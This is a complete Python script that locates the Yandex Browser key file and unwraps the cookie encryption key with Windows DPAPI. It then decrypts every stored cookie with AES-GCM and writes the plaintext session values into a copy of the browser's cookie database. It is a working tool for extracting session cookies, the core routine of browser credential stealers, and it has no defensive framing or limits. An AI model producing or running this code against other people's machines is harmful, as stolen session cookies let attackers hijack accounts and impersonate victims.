import base64
import json
import os
import shutil
import sqlite3
from typing import Optional

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


class YandexCookieDecryptor:
    def __init__(self):
        self.local_state_path = os.path.expandvars(
            r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Local State"
        )
        self.cookies_path = os.path.expandvars(
            r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default\Network\Cookies"
        )
        self.decryption_key = self._get_decryption_key()

    def _get_decryption_key(self) -> bytes:
        try:
            with open(self.local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove DPAPI prefix
            encrypted_key = encrypted_key[5:]
            decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return bytes.fromhex(decrypted_key.hex())
        except Exception as e:
            raise RuntimeError(f"Failed to get decryption key: {str(e)}")

    def _decrypt_value(self, encrypted_value: bytes) -> Optional[str]:
        if not encrypted_value:
            return None

        if not encrypted_value.startswith(b"v10"):
            return None

        try:
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]

            cipher = AES.new(self.decryption_key, AES.MODE_GCM, nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)

            try:
                return decrypted.decode("utf-8")
            except UnicodeDecodeError:
                return decrypted.hex()
        except Exception as e:
            raise RuntimeError(f"Decryption failed: {str(e)}")

    def copy_and_decrypt_cookies(
        self, output_path: str = "cookies_decrypted.db"
    ) -> None:
        try:
            shutil.copy2(self.cookies_path, output_path)

            conn = sqlite3.connect(output_path)
            cursor = conn.cursor()

            try:
                cursor.execute("ALTER TABLE cookies ADD COLUMN decrypted_value TEXT")
            except sqlite3.OperationalError:
                pass

            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            cookies = cursor.fetchall()

            for host, name, encrypted_value in cookies:
                try:
                    decrypted_value = self._decrypt_value(encrypted_value)
                    cursor.execute(
                        "UPDATE cookies SET decrypted_value = ? WHERE host_key = ? AND name = ?",
                        (decrypted_value, host, name),
                    )
                except Exception as e:
                    print(f"[-] Error decrypting {host} | {name}: {e}")

            conn.commit()
            print(f"\n[+] Cookies copied and decrypted to {output_path}")

        except Exception as e:
            raise RuntimeError(f"Failed to process cookies database: {str(e)}")
        finally:
            if "conn" in locals():
                conn.close()


def main():
    try:
        decryptor = YandexCookieDecryptor()

        decryptor.copy_and_decrypt_cookies()

    except Exception as e:
        print(f"[-] Critical error: {str(e)}")
        return 1

    return 0


if __name__ == "__main__":
    exit(main())
